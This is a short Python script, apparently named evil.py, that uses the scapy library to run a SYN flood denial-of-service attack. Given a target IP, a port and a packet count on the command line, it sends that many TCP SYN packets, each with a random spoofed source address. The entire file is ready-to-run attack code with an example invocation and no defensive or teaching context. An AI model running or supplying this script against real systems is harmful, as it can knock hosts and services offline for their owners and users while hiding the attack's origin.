import os
import sys
import random
import argparse
from scapy.all import *

#example line: sudo python3 evil.py --ip 192.168.0.3 --gate 3001 --n_pkt 1000

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('--ip', type=str, help='Target IP address')
parser.add_argument('--gate', type=str , help='Gate of attack')
parser.add_argument('--n_pkt', type=str , help='Number of packages')

args = parser.parse_args()

def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

def randInt():
    x = random.randint(1000, 9000)
    return x


def attack_syn_flooding(targetIP, targetPort, counter):
    total = 0
    print("Packets are being sent ...")
    for x in range(0, counter):
        sPort = randInt()
        sEq = randInt()
        wIndown = randInt()

        IP_pkt = IP()
        IP_pkt.src = randomIP()
        IP_pkt.dst = targetIP

        tcp_pkt = TCP()
        tcp_pkt.sport = sPort
        tcp_pkt.dport = targetPort
        tcp_pkt.flags = "S"
        tcp_pkt.seq = sEq
        tcp_pkt.window = wIndown

        send(IP_pkt / tcp_pkt, verbose=0)
        total += 1
    sys.stdout.write("\nSent packets %i\n" % total)


def info():

    targetIP = args.ip
    targetPort = args.gate

    return targetIP, int(targetPort)

def main():
    targetIP, targetPort = info()
    counter = args.n_pkt
    print(args)
    attack_syn_flooding(targetIP, targetPort, int(counter))

main()